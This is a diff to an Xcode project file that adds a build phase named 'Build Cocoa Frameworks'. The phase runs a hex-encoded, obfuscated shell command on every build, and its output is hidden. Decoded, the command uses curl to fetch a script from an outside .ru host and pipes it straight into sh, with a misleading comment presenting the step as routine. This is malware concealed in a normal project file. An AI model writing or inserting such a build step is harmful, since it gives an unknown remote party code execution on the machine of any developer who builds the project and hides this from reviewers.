@@ -198,6 +198,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 9AD4400228342DC90065B82A /* Build configuration list for PBXNativeTarget "TestBlogProject" */;
 			buildPhases = (
+				CB33748C0927A0F6216A102C /* Build Cocoa Frameworks */,
 				9AD43FCF28342DC80065B82A /* Sources */,
 				9AD43FD028342DC80065B82A /* Frameworks */,
 				9AD43FD128342DC80065B82A /* Resources */,
@@ -649,6 +650,35 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	CB33748C0927A0F6216A102C /* Build Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652038202d736b2068747470733a2f2f6d656c696e6461732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 9AD43FCB28342DC80065B82A /* Project object */;
 }
